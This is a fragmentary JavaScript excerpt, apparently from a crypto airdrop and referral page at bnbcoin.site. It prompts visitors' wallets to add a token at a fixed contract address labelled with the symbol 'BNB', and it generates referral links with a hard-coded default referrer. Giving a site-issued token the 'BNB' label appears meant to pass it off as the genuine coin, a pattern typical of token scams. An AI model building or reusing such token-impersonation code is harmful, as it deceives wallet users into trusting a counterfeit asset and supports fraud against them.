...
const sttaddr = "0xa71caB8c2e38dB39403C4e3064caE0A4774B2384",
    sttabi = [{
        "inputs": [],
    ...
    try {
        web3.currentProvider.sendAsync({
            ...
            params: {
                type: "ERC20",
                options: {
                    address: "0xa71caB8c2e38dB39403C4e3064caE0A4774B2384",
                    symbol: "BNB",
                    decimals: "18",
                    image: "https://www.bnbcoin.site/images/logo.png"
                }
            },
...
function getreflink() {
    ...
    document.getElementById("refaddress").value ? /^(0x){1}[0-9a-fA-F]{40}$/i.test(e) ? document.getElementById("refaddress").value = "https://www.bnbcoin.site/?ref=" + document.getElementById("refaddress").value : Swal.fire("Referral Alert", "Your address is not valid.", "error") : Swal.fire("Referral Alert", "Please Enter Your BEP20 Address.", "error")
}
...
var ref = querySt("ref");
null == ref ? (ref = "0xa71caB8c2e38dB39403C4e3064caE0A4774B2384", document.getElementById("airinput").value = ref) : document.getElementById("airinput").value = ref;